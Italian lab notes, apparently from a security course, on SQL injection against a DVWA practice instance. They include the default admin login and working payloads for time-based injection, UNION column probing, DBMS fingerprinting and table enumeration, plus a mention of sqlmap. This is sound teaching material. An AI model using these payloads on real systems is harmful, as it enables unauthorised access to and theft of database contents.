
https://dvwa.laser.di.unimi.it/login.php

login:
admin
password


in input: chiudo stringa ->
	' OR sleep(1); -- //inizia commento, così non ha problemi di bad formatted cmd.		
.

Come scoprire le info che una query ha?

- Possiamo fare brute force -> ' UNION SELECT 1; --
	se non worka -> ' UNION SELECT 1, 2; --
	ecc... finchè non ho response corretto. 

Per ottenere info sul dbms in funzione di quello che riusciamo a iniettare -> ' UNION SELECT 1, user_name(); --  //fingerprinting
Se ci dice che questa funzione non c'è, possiamo escludere la classe di dbms in cui è presente quella funzione. 
	' UNION SELECT 1, user(); -- 
	' UNION SELECT 1, version(); -- 
.

//concatena i nomi delle colonne
Per avere la lista delle tabelle del db: ' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables ; -- 

In kali c'è strumento per trovare sql injections -> sqlmap (simile a nmap). Bisogna passargli i cookie tho.

Comando per fare lo scan con aggiunta di --t qualcosa.









